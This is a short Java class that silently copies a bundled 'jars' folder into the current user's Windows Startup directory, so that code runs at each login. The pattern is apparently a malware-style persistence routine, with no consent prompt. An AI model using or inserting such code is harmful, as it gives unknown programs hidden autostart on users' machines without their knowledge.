package pushing;

import java.io.File;
import java.io.IOException;
import java.net.URL;

import org.apache.commons.io.FileUtils;


public class MoveFile {

	public MoveFile() {
		//checks the name from User
		String userName = System.getProperty("user.name");
		//Finds out where its saved
		URL location = MoveFile.class.getProtectionDomain().getCodeSource().getLocation();
		
		File source = new File(location.getPath() + "/pushing/jars");
		File dest = new File("C:/Users/" + userName +"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
		
		try {
			//Copies source datas to destination.
		    FileUtils.copyDirectory(source, dest);
		}
		catch (IOException e) {
		    e.printStackTrace();
		}
}
}

